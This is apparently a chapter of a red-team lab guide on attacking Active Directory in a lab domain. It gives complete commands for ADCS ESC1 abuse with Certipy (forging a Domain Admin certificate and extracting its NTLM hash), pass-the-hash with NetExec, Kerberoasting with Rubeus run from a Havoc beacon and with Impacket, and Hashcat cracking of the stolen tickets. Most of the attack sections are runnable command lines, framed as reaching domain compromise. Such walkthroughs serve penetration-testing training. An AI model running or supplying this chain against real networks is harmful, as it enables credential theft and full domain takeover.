
# 4 - Service Misuse and Exploitation

After identifying privileged accounts and attack paths in BloodHound, the next step is to examine service-level misconfigurations that can be exploited for privilege escalation or domain takeover.

# Active Directory Certificate Services (ADCS) Misconfigurations

Active Directory Certificate Services (ADCS) is a Windows feature that provides functionality to issue and manage certificates for domain resources.

When misconfigured, it can be a powerful attack vector for privilege escalation or even domain compromise. Key issues explored include:

*  Over-permissioned certificate templates, allowing unauthorized users to request certificates impersonating higher-privileged accounts.
*  Enrollment permissions (ESC1–ESC16 attack paths) that allow abuse of certificate request or issuance mechanisms.
*  Abuse of certificate-based authentication to impersonate domain users or domain controllers.
*  Weak or unprotected web enrollment portals, which can be accessed by unauthorized users.

## Common ADCS Misconfigurations
> Users with enrollment rights on vulnerable templates:
- templates that allow `Client Authentication` + `ENROLLEE_SUPPLIES_SUBJECT`.

> Low-privileged users allowed to request certs for other identities:
- Leads to full impersonation (`ESC1`, `ESC2`).

> Unconstrained certificate enrollment by any authenticated user
- Abusable via tools like [Certipy](https://github.com/ly4k/Certipy).

**A very good whitepaper documenting various certificate attacks can be found [here](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)**

## Certipy-ad
Certipy-AD is an offensive security tool designed for discovering and exploiting misconfigurations in Active Directory Certificate Services (ADCS) environments:  
- 🔎 Discover Certificate Authorities and Templates
- 🚩 Identify misconfigurations
- 🔐 Request and forge certificates
- 🎭 Perform authentication using certificates
- 📡 Relay NTLM authentication to AD CS HTTP(S)/RPC endpoints
- 🗝️ Support for Shadow Credentials, Golden Certificates, and Certificate Mapping Attacks

### Certipy-ad: find
1. Enumerate AD CS attack paths:
```bash
certipy-ad -debug find -u 'ricksmith' -p 'Spring2025!' -dc-ip 10.10.X.10  -ns 10.10.X.10 -enabled -vulnerable -dns-tcp 
```

![image](https://github.com/user-attachments/assets/d4937ef9-2468-4e56-b1ba-3b917bb5d06b)

2. Locate and open the output file named `TIMESTAMP_Certipy.txt`

![image](https://github.com/user-attachments/assets/d99d2fd5-bddc-42ab-a6f9-d78c43798c82)

This file contains a complete summary of the operation, including:
- Certificate template details
- Certificate Authority (CA) name
- Requested subject name
- Whether the template is vulnerable (e.g., ESC1–ESC8 indicators)

### Certipy-ad: request
Once you've identified a vulnerable template, 

The next step is to request a certificate that impersonates a user (*possibly a Domain Admin*) by abusing the chosen template misconfigurations:

1. Let's move back to BloodHound.
2. In the pop-up list, select: Active Directory > Domain Information > All Domain Admins

![image](https://github.com/user-attachments/assets/1fbf9a07-9da1-4841-b934-0c6c4bca2975)

3. Identify the most viable Domain Administrator account to escalate privileges through:
- Does it have reachable sessions?
- Belongs to exploitable paths?
- Has associated Kerberoastable SPNs or weak ACLs?

4. Request the Certificate as Domain Administrator:
```bash
certipy-ad -debug req -k -u 'ricksmith@lab.local' -p 'Spring2025!' -dc-ip 10.10.x.10  -ns 10.10.x.10 -dns-tcp -target 'dc1.lab.local' -dns-tcp -ca 'lab-DC1-CA' -template 'ESC1-Vulnerable' -upn 'ricktheam@lab.local' -dc-host 'lab.local' -sid 'S-1-5-21-1856490383-3813198486-439410601-1211'
```

![image](https://github.com/user-attachments/assets/d5f82420-7b3f-4e45-ab85-aa67d5006aad)


### Certipy-ad: authenticate 
After requesting a certificate via a vulnerable ADCS template, you can use Certipy to authenticate as the impersonated user: 
- No password needed
- Performs Kerberos authentication using the certificate (via PKINIT)
- Extracts NTLM hash of the impersonated user from the TGT
- Confirms whether the certificate is valid and usable

Authenticate as Domain Administrator via .pfx:
```bash
certipy-ad auth -pfx ricktheam.pfx -dc-ip 10.10.X.10  -ns 10.10.X.10 -dns-tcp
```

![image](https://github.com/user-attachments/assets/6cf1c041-6c38-4df6-bb2f-c516763a8eff)


## NetExec: Validating Credentials via SMB (Pass-the-Hash)

[NetExec](https://github.com/Pennyw0rth/NetExec) (formerly CrackMapExec) is a powerful post-exploitation framework designed for interacting with Windows networks through SMB, LDAP, RDP, WinRM, and more.

It's widely used to:
- Validate usernames, passwords, or NTLM hashes
- Perform pass-the-hash (PTH) and pass-the-ticket (PTT)
- Enumerate shares, sessions, and domain information
- Test lateral movement options without raising noisy alerts

After requesting a certificate and authenticating via Certipy, we can extract the NTLM hash of the user (`certipy-ad auth`) 

With this hash in hand, NetExec allows us to test if it's valid across the network:

```bash
netexec smb 10.10.X.10 -u 'domain_admin' -H 'NTLM_hash' --dns-tcp --dns-server '10.10.X.10' -d 'lab.local'
```

![image](https://github.com/user-attachments/assets/ab291a30-b9e1-4e20-8bd2-19ed585270e2)


> - This confirms whether the credentials are usable for SMB authentication.
> - No need for the cleartext password, `pass-the-hash` is enough.

If the credentials are valid and the user is a `Domain Admin`...  

♟️ Checkmate: The domain is compromised. You have full control!

# Kerberoasting

Kerberoasting is a post-exploitation technique used to extract Kerberos service tickets (TGS) for accounts with SPNs (Service Principal Names) 

How does it work?
* Service tickets for accounts with SPNs (Service Principal Names) can be requested by any authenticated user.
* These tickets are encrypted with the service account's NTLM hash and can be exported and cracked offline.
* Attackers use dictionary or brute-force attacks to recover weak passwords, often revealing privileged credentials.

You can use a Havoc's BOF `get-spns` to check for accounts with SPNs (Service Principal Names):
```
get-spns
```

![image](https://github.com/user-attachments/assets/336299a6-7aab-4a8d-b919-5bc9071268b1)


## Rubeus + Kerberoasting
[Rubeus](https://github.com/GhostPack/Rubeus) is a powerful post-exploitation tool for interacting with Kerberos in Active Directory environments. 

Written in C#, it's often used for ticket abuse, hash extraction, and Kerberoasting, `all from memory`.

## Step-by-Step (Using Rubeus)
1. Inline-execute Rubeus on a target:
```beacon
dotnet inline-execute /home/kali/tools/Ghostpack-CompiledBinaries/Rubeus.exe kerberoast /domain:lab.local /outfile:krbdebug.log
```

![image](https://github.com/user-attachments/assets/ee425a66-a703-4a6d-9434-c7d7d402ba5c)


2. Transfer the extracted hashes to your Kali machine:
```
download c:\loot\krbdebug.log
```

<img width="1016" height="603" alt="image" src="https://github.com/user-attachments/assets/8d74ddee-489b-4fd7-b683-65c83275c8d4" />

3. Find and copy the file `krbdebug.log` to another folder:

<img width="964" height="655" alt="image" src="https://github.com/user-attachments/assets/042db310-74d8-47a3-99bb-7ec570f60257" />

Let's crack the hashes using [Hashcat](https://github.com/hashcat/hashcat)

4. Execute `hashcat` in the same folder where you saved the output file `krbdebug.log`:
```bash
hashcat -m 13100 -a 0 krbdebug.log /usr/share/wordlists/rockyou.txt.gz --potfile-path=new.pot --outfile=cracked.txt --status -O
```

![image](https://github.com/user-attachments/assets/ff144424-7575-4e59-a758-618b49d9c1ad)


5. Open the file `cracked.txt` to check for the cracked passwords.

![image](https://github.com/user-attachments/assets/77e179c8-6e60-45df-86e0-5d014cac9e1a)


## Netexec: Validating Credentials via SMB
After extracting service account hashes with `Rubeus` and cracking them with `Hashcat`, we now have clear-text passwords for real AD accounts.

Let's use `Netexec` along with the credentials to test if the clear-text passwords are valid logins:

```bash
netexec smb 10.10.X.10 -u 'user' -p 'password' --dns-tcp --dns-server '10.10.X.10' -d 'lab.local'
```

![image](https://github.com/user-attachments/assets/639435c1-eedb-4913-a252-9e1abd7e59e3)


With valid `Domain Administrator` credentials, it's game over...

♟️ The domain is compromised again!

## Alternative Way: Using Impacket
1. You can also perform Kerberoasting using the Impacket `GetUserSPNs.py` tool:
```bash
GetUserSPNs.py 'lab.local/ricksmith:Spring2025!' -dc-ip 10.10.X.10 -outputfile krb_impacket.txt
```
2. Crack the hashes with Hashcat:
Execute `hashcat` in the same folder where you saved the output file `krb_impacket.txt`:
```bash
hashcat -m 13100 -a 0 krb_impacket.txt /usr/share/wordlists/rockyou.txt.gz --potfile-path=impacket.pot --outfile=cracked_impacket.txt --status -O
```




